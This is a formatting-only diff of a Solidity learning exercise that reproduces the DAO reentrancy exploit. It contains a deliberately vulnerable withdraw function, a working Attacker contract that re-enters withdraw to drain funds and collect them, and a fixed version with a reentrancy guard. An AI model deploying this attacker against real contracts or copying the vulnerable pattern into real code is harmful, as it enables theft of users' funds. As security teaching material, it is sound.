@@ -1,12 +1,11 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.34;
 
-
 /*
 
-i wrote the first like case study and gave it to ai and to make it polish and to make it like better 
+i wrote the first like case study and gave it to ai and to make it polish and to make it like better
 and it gave me this so i asked to make it proffessional and shit so i wrote it and ai make it better okay
-so like this like casestudy like the note is like edited and modifed by ai okay i want to admit that and i 
+so like this like casestudy like the note is like edited and modifed by ai okay i want to admit that and i
 did what i do best okay.
 
 ================================================================================
@@ -69,8 +68,6 @@ taught the industry why security patterns exist, not just how to apply them.
 ================================================================================
 */
 
-
-
 /*
 
 Tier 4 Exercise 5 — Reproduce a Historical Exploit
@@ -128,100 +125,98 @@ error NotEnough();
 error NotOwner();
 
 contract TheDAO_Vulnerable {
-	mapping(address => uint256) public balances;
+    mapping(address => uint256) public balances;
 
-	function deposit() payable public {
+    function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
 
     function withdraw(uint256 amount) public {
-        if(balances[msg.sender] < amount) revert NotEnough();
+        if (balances[msg.sender] < amount) revert NotEnough();
 
-        (bool success, ) = msg.sender.call{value: amount}(""); 
+        (bool success,) = msg.sender.call{value: amount}("");
         require(success, "failed transaction");
 
-        balances[msg.sender] -= amount; 
+        balances[msg.sender] -= amount;
     }
 
-    function getBalance() public view returns(uint256) {
-    	return address(this).balance;
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
 
-
 contract Attacker {
-	TheDAO_Vulnerable public target; 
-	uint256 public amountToWithdraw = 1 ether; 
-	uint256 public whenToStop = 3640000 ether;
+    TheDAO_Vulnerable public target;
+    uint256 public amountToWithdraw = 1 ether;
+    uint256 public whenToStop = 3640000 ether;
 
-	address private owner; 
+    address private owner;
 
     constructor(address _target) {
         target = TheDAO_Vulnerable(_target);
         owner = msg.sender;
-
     }
 
     function exploitDeposit() external payable {
-    	target.deposit{value: msg.value}();
-	}
+        target.deposit{value: msg.value}();
+    }
 
     function attack() external payable {
-    	 require(msg.value >= amountToWithdraw, "Send ETH");
-    	target.deposit{value: amountToWithdraw}();
-    	target.withdraw(amountToWithdraw);
+        require(msg.value >= amountToWithdraw, "Send ETH");
+        target.deposit{value: amountToWithdraw}();
+        target.withdraw(amountToWithdraw);
     }
 
     receive() external payable {
         if (address(target).balance >= amountToWithdraw) {
-        	target.withdraw(amountToWithdraw);
-    	}
+            target.withdraw(amountToWithdraw);
+        }
     }
 
     function collect(address _to) public {
-    	if(owner != msg.sender) revert NotOwner();
+        if (owner != msg.sender) revert NotOwner();
 
-    	(bool success, ) = payable(_to).call{value : address(this).balance}("");
-    	require(success , "transfer failed");
+        (bool success,) = payable(_to).call{value: address(this).balance}("");
+        require(success, "transfer failed");
     }
 }
 
 contract TheDAO_Fixed {
-	mapping(address => uint256) public balances;
+    mapping(address => uint256) public balances;
 
-	uint256 private constant NOT_ENTERED = 1;
+    uint256 private constant NOT_ENTERED = 1;
     uint256 private constant ENTERED = 2;
 
     uint256 private status;
 
-	modifier nonReentrant() {
-		require(status == NOT_ENTERED, "IT IS REENTERING");
+    modifier nonReentrant() {
+        require(status == NOT_ENTERED, "IT IS REENTERING");
 
-		status = ENTERED;
+        status = ENTERED;
 
-		_;
+        _;
 
-		status = NOT_ENTERED;
-	}
+        status = NOT_ENTERED;
+    }
 
-	constructor() {
-		status = NOT_ENTERED;
-	}
+    constructor() {
+        status = NOT_ENTERED;
+    }
 
-	function deposit() payable public {
+    function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
 
     function withdraw(uint256 amount) public nonReentrant {
-        if(balances[msg.sender] < amount) revert NotEnough();
+        if (balances[msg.sender] < amount) revert NotEnough();
 
-        balances[msg.sender] -= amount; 
+        balances[msg.sender] -= amount;
 
-        (bool success, ) = msg.sender.call{value: amount}(""); 
+        (bool success,) = msg.sender.call{value: amount}("");
         require(success, "failed transaction");
     }
 
-    function getBalance() public view returns(uint256) {
-    	return address(this).balance;
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
